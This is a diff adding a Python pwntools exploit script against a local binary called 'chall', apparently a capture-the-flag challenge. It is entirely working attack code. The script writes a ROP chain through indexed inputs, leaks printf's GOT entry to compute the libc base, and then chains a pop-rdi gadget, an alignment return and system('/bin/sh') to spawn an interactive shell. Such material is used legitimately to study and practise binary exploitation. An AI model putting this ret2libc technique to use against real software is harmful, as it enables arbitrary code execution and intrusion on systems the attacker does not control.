@@ -1,0 +1,64 @@
+from pwn import *
+
+def add_to_rop_chain(pelf, arr_index, txt_str = ''):
+    p.clean()
+    pelf.sendline(str(arr_index))
+
+    if arr_index != -1:
+        pelf.sendline(str(txt_str))
+
+def printf_rop(p, pelf):
+    # GOING TO RUN INTO movaps IF I DO NOT ALIGN THE STACK
+
+    g_pop_rdi = rop.rdi.address # scanf will do most of the work for us
+    f_printf_got = pelf.got['f_printf']
+    f_puts_plt = pelf.plt['puts']
+
+    # we just keep calling scanf lol
+    add_to_rop_chain(p, 23, g_pop_rdi)
+    add_to_rop_chain(p, 24, str(f_printf_got))
+    add_to_rop_chain(p, 25, str(f_puts_plt))
+    add_to_rop_chain(p, 26, str(pelf.sym['main']))
+    add_to_rop_chain(p, -1)
+
+    output = p.clean()
+    output = output.strip().split(b'\n')[1]
+
+    print(output)
+    return u64(output.strip().ljust(8, b'\x00'))
+
+context.binary = elf = ELF('chall')
+rop = ROP(elf)
+f_printf = elf.plt['f_printf']
+
+p = process('./chall')
+#gdb.attach(p)
+
+# receive the first three lines
+p.recvline()
+p.recvline()
+p.recv()
+
+# arb write the return pointer
+a_printf = printf_rop(p, elf)
+print('SENT ROP CHAIN YEAHHHH')
+print(a_printf)
+
+printf_offset = 0x54110
+a_libc = a_printf - printf_offset
+
+libc = elf.libc
+libc.address = a_libc
+
+system = libc.symbols['system']
+binsh = next(libc.search(b'/bin/sh\x00'))
+
+g_return = 0x40101a
+rdi_gadget = rop.rdi.address
+add_to_rop_chain(p, 23, str(rdi_gadget))
+add_to_rop_chain(p, 24, str(binsh))
+add_to_rop_chain(p, 25, str(g_return)) # need this for stack alignment
+add_to_rop_chain(p, 26, str(system))
+add_to_rop_chain(p, -1)
+
+p.interactive()
